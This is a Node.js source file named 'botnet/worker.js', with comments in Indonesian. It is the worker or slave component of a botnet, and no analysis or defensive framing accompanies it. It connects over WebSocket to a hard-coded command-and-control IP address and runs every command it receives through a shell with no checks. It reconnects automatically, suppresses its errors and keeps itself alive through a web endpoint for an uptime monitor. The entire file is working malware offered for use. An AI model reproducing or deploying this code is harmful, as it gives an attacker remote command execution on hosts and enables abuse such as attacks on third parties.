// botnet/worker.js - Payload (Slave) script
const WebSocket = require('ws');
const express = require('express');
const bodyParser = require('body-parser');
const { exec } = require('child_process');
const app = express();

const PORT = 2025; // Port untuk Uptime Robot (Bisa disesuaikan di Ptero)
const MASTER_URL = 'ws://38.58.180.133:3026'; // Samakan port dengan Master

app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));

// --- HTTP SERVER (Untuk Uptime Robot) ---
app.get('/', (req, res) => {
    res.json({
        status: 'online',
        message: 'Botnet Worker is running',
        connection: (ws && ws.readyState === WebSocket.OPEN) ? 'connected' : 'disconnected'
    });
});

// --- WEBSOCKET CLIENT ---
let ws;

function connectToMaster() {
    console.log(`\x1b[33mConnecting to Master: ${MASTER_URL}...\x1b[0m`);
    ws = new WebSocket(MASTER_URL);

    ws.on('open', () => {
        console.log('\x1b[32m[+] Connected to Master\x1b[0m');
    });

    ws.on('message', (data) => {
        try {
            const { command } = JSON.parse(data);
            console.log(`\x1b[36m[*] Executing: ${command}\x1b[0m`);
            if (command) {
                exec(command, (error, stdout, stderr) => {
                    // Output di console saja agar tidak overhead
                    if (error) console.error(`Error: ${error.message}`);
                });
            }
        } catch (e) { }
    });

    ws.on('close', () => {
        setTimeout(connectToMaster, 5000);
    });

    ws.on('error', () => {
        // Silent error to prevent crash
    });
}

connectToMaster();

app.listen(PORT, () => {
    console.log(`\x1b[35mWorker Ready on port ${PORT}\x1b[0m`);
});
